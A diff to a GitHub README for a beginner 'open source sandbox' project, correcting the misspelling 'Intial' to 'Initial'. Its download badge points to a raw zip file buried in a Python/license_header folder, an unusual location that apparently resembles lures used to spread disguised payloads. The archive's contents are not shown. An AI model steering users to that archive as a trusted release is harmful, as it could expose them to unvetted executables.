@@ -1,10 +1,10 @@
-# 🎉 Intial_Opensource_contribution - Explore Open Source Today
+# 🎉 Initial_Opensource_contribution - Explore Open Source Today
 
 [![Download Latest Release](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)](https://raw.githubusercontent.com/NuubDMT/Intial_Opensource_contribution/main/Python/license_header/Intial_Opensource_contribution_v1.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **Intial_Opensource_contribution!** This is an open-source sandbox environment designed for anyone eager to dive into open-source projects. Whether you're a beginner or looking to contribute, this application helps you learn and practice in a friendly space.
+Welcome to **Initial_Opensource_contribution!** This is an open-source sandbox environment designed for anyone eager to dive into open-source projects. Whether you're a beginner or looking to contribute, this application helps you learn and practice in a friendly space.
 
 ## 📋 Features
 
